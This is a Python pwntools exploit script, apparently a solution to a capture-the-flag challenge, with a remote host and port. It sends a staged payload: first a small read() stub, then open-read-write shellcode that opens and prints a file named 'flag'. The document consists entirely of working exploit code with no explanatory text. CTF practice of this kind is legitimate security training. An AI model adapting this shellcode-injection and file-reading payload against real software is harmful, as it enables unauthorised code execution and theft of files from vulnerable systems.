from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["week-1.hgame.lwsec.cn",31160]
libc=ELF('./libc-2.31.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./vuln_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p)

ru(b'shellcode:\n')
shellcode = asm('''
    mov rsi,rdx
    xor rax,rax
    xor rdi,rdi
    syscall
''')

s(shellcode)
pause()
orw = asm('''
    push 0x67616c66 
    mov rdi,rsp
    xor esi,esi 
    mov eax,2
    syscall
    mov edi,eax
    mov rsi,rsp
    mov rdx,0x30
    xor eax,eax
    syscall
    xor edi,2 
    mov rsi,rsp
    mov eax,edi
    syscall 
''')

payload = b'a' * (0xb) + orw
s(payload)

shell()
